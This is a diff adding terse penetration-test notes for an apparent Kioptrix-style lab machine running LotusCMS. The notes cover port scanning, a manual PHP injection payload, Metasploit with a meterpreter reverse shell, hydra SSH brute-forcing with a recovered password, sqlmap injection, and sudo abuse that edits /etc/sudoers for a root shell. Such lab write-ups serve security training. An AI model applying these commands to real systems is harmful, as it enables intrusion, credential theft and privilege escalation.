@@ -1,0 +1,66 @@
+#
+0. Vulnerabilities
+
+    File Inclusion
+    Improper Access Control
+    Reused Credentials
+    SQL Injection
+    Unrestricted Upload of File with Dangerous Type
+    Weak Credentials
+
+1. Enumenation
+LotusCRM
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+
+2. Getting a shell
+2.1.1 Manually LotusCMS
+#we have LotusCMS
+#search exploits
+searchsploit lotuscms
+# we get msf exploit
+#try to use this exploit manually
+#read code of exploit. in code we see
+sploit = "');#{payload.encoded}#"
+'method'  => 'POST'
+#this means that we can transfer used PORT
+#in HackBar "enable post data"
+page=index');${system('id')};#
+
+2.1.2 With Metasploit LotusCMS
+use exploit/multi/http/lcms_php_exec
+set rhost <ip-victim>
+set url /
+set payload php/meterpreter/reverse_tcp
+set lhost <ip-host>
+
+
+2.2. Brute ssh
+#name <loneferret>
+hydra -l loneferret -P 10_million_password_list_top_10000.txt 192.168.75.132 ssh -t 4
+pass: starwars
+
+2.3 Enumenation
+uname -mrs
+# kernel -- Linux 2.6.24-24-server i686
+#distrib -- Ubuntu 8.04.3 LTS
+
+2.4 SQL injection
+dirb http://192.168.75.132/gallery -X .php | grep 200
+
++ http://192.168.75.132/gallery/gallery.php (CODE:200|SIZE:1654)               
++ http://192.168.75.132/gallery/vote.php (CODE:200|SIZE:32)      
+
+#vulnerable par
+192.168.75.132/gallery/gallery.php?id=1
+sqlmap -u "http://192.168.75.132/gallery/gallery.php?id=1" -a
+
+#https://kongwenbin.wordpress.com/2016/10/30/writeup-for-kioptrix-level-1-2-3/
+1. Brue SSH
+2. sudo -l
+ (root) NOPASSWD: /usr/local/bin/ht
+
+#that means thas loneferret can run ht as a root
+3. ht, F3(open), /etc/sudoers
+4. add to line loneferret ALL=NOPASSWD: ... /bin/bash
+5. sudo /bin/bash
